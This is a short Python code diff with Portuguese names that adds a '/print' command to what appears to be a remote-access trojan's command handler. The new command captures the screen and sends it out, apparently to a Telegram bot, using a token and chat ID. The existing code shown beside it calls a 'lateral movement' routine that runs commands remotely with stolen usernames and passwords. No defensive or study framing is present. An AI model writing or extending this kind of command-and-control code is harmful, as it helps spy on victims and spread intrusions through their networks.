@@ -53,6 +53,9 @@ def processar_comando(msg):
             return movimento_lateral.exec_remoto(ip, usuario, senha, comando)
         except Exception as e:
             return f"Erro no comando /exec: {e}"
+        
+    elif msg == "/print":
+        return screenshot.capturar_screenshot(TOKEN, CHAT_ID)
 
     else:
         return "Comando desconhecido."
